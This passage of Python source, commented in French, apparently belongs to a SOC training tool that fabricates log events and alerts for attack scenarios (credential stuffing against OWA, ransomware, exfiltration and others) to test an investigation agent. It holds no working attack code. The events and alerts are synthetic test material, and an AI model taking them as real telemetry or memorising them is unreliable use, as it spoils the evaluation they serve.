            raw_event=f"OWA authentication failed: User WAYNE\\{username} from {attacker_ip}",
            metadata={"event_id": 4625, "logon_type": 8, "failure_reason": "bad_password",
                       "service": "OWA"},
        ))

    # 2 login réussis (credentials valides dans la fuite)
    for idx, username in enumerate(["lucius.fox", "barbara.gordon"]):
        events.append(_event(
            _ts(base, 1, idx * 15), LogSourceType.AUTH, sid,
            src_ip=attacker_ip, dest_ip=target_ip,
            user=f"WAYNE\\{username}", host=target_host,
            action="login_success",
            raw_event=f"OWA authentication successful: User WAYNE\\{username} from {attacker_ip}",
            metadata={"event_id": 4624, "logon_type": 8, "service": "OWA"},
        ))
        events.append(_event(
            _ts(base, 1, idx * 15 + 5), LogSourceType.WEBSERVER, sid,
            src_ip=attacker_ip, dest_ip=target_ip, dest_port=443,
            action="GET", host=target_host,
            raw_event=f'{attacker_ip} - {username} "GET /owa/inbox HTTP/1.1" 200 34521',
            metadata={"http_method": "GET", "uri": "/owa/inbox", "status_code": 200},
        ))

    # Firewall — beaucoup de connexions courtes
    events.append(_event(
        _ts(base, 0, 0), LogSourceType.FIREWALL, sid,
        src_ip=attacker_ip, dest_ip=target_ip, src_port=60000, dest_port=443,
        action="allow", host="fw-01",
        raw_event=f"id=firewall action=allow srcip={attacker_ip} dstip={target_ip} dstport=443 sessions=28",
        metadata={"protocol": "tcp", "total_sessions": 28, "bytes_sent": 42000, "bytes_received": 28000,
                   "session_duration_avg": 3},
    ))

    alert = Alert(
        id="ALT-2024-008",
        timestamp=_ts(base, 0, 30),
        source="Windows Event Log",
        title="Multiple Failed OWA Logins from Single External IP",
        description=(
            f"12 failed authentication attempts detected against Outlook Web Access "
            f"({target_host}) from external IP {attacker_ip} within 1 minute. "
            f"Different usernames targeted with unique passwords — pattern consistent "
            f"with credential stuffing (not brute force)."
        ),
        raw_data={
            "src_ip": attacker_ip,
            "dest_ip": target_ip,
            "dest_port": 443,
            "event_id": 4625,
            "unique_users_targeted": len(users),
            "failure_count": len(users),
            "success_count": 2,
            "time_window_seconds": 60,
            "service": "OWA",
            "timestamp": _ts(base, 0, 30).isoformat(),
        },
        status=AlertStatus.PENDING,
        scenario_id=sid,
    )

    return events, json.loads(alert.model_dump_json())


# ──────────────── Orchestrateur principal ────────────────


SCENARIO_GENERATORS = {
    "scenario_01_web_defacement": generate_scenario_01_web_defacement,
    "scenario_02_brute_force": generate_scenario_02_brute_force,
    "scenario_03_ransomware": generate_scenario_03_ransomware,
    "scenario_04_data_exfiltration": generate_scenario_04_data_exfiltration,
    "scenario_05_reconnaissance": generate_scenario_05_reconnaissance,
    "scenario_06_false_positive": generate_scenario_06_false_positive,
    "scenario_07_ambiguous_lateral": generate_scenario_07_ambiguous_lateral,
    "scenario_08_credential_stuffing": generate_scenario_08_credential_stuffing,
}


def generate_all(output_dir: Path) -> None:
    """Génère tous les scénarios et les écrit en JSONL + alertes JSON."""
    scenarios_dir = output_dir / "scenarios"
    alerts_dir = output_dir / "alerts"
    scenarios_dir.mkdir(parents=True, exist_ok=True)
    alerts_dir.mkdir(parents=True, exist_ok=True)

    all_alerts: list[dict] = []
    total_events = 0

    for scenario_name, generator in SCENARIO_GENERATORS.items():
        events, alert = generator()

        # Écrire les événements en JSONL
        jsonl_path = scenarios_dir / f"{scenario_name}.jsonl"
        with jsonl_path.open("w", encoding="utf-8") as fh:
            for event in events:
                fh.write(json.dumps(event, default=str) + "\n")

        all_alerts.append(alert)
        total_events += len(events)
        print(f"  ✓ {scenario_name}: {len(events)} events → {jsonl_path.name}")

    # Écrire toutes les alertes
    alerts_path = alerts_dir / "sample_alerts.json"
    with alerts_path.open("w", encoding="utf-8") as fh:
        json.dump(all_alerts, fh, indent=2, default=str)

    print(f"\n{'='*60}")
    print(f"Total: {len(all_alerts)} alerts, {total_events} log events")
    print(f"Scenarios: {scenarios_dir}")
    print(f"Alerts: {alerts_path}")


if __name__ == "__main__":
    project_root = Path(__file__).resolve().parent.parent
    data_dir = project_root / "data"
    print("SentinelSOC — Generating investigation scenarios\n")
    print("Based on Splunk BOTS v1 (Boss of the SOC) attack patterns")
    print("=" * 60)
    generate_all(data_dir)
    print("\nDone. Ready for investigation agent.")
